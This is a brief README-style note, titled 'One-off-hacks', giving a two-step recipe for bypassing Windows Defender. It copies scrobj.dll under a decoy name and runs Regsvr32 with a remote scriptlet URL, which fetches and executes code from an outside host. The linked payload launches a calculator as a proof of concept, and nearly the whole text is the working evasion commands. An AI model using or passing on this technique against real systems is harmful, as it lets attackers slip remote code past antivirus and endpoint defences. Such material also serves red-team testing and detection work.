# One-off-hacks

### Bypass AV/EDR test found [here](https://www.trustedsec.com/blog/discovering-the-anti-virus-signature-and-bypassing-it/) and here at [twitter](https://twitter.com/mrd0x/status/1461041276514623491?s=20)
Bypass Defender AV by:
1. copying and renaming scrobj.dll  
`copy c:\windows\system32\scrobj.dll NothingToSeeHere.dll`
2. Testing that by launching calc  
`Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct
NothingToSeeHere.dll`
